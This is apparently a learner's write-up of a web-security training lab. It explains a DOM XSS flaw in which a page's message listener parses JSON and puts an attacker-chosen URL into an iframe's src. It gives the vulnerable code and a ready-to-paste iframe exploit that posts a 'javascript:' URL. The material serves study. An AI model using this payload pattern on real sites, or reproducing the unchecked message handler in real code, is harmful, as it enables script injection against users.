Task 3:
///Lab: DOM XSS using web messages and JSON.parse///

Script part from the source code:

                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);

Lets see whats going on here...The code is waiting for not a simple message, but for a JSON object...(like: {"something": "anything", "url": "...", "etc": "btc"}). 
So the variable 'd' will be our message which has to be in this format: {"x": "y", "z": "..."}. From the code we can see there is a d.type and 3 cases, the "load-channel" case is changing the iframe.src's value 
to what we send in the d.url.
Which means we payload will be {"type": "load-channel", "url": "javascript:print()"} >>>since it is going into the 'attribute sink' (iframe.src).
Now. Paste this into the exploit servers body:
<iframe src=https://0a8f00a90398303483a95177007400b7.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
The \ characters are "escape characters". we need them because the javascript's motor reads the code from the left to the right, and after the second " the code would be just rubbish for the compiler, which
is not good for us.

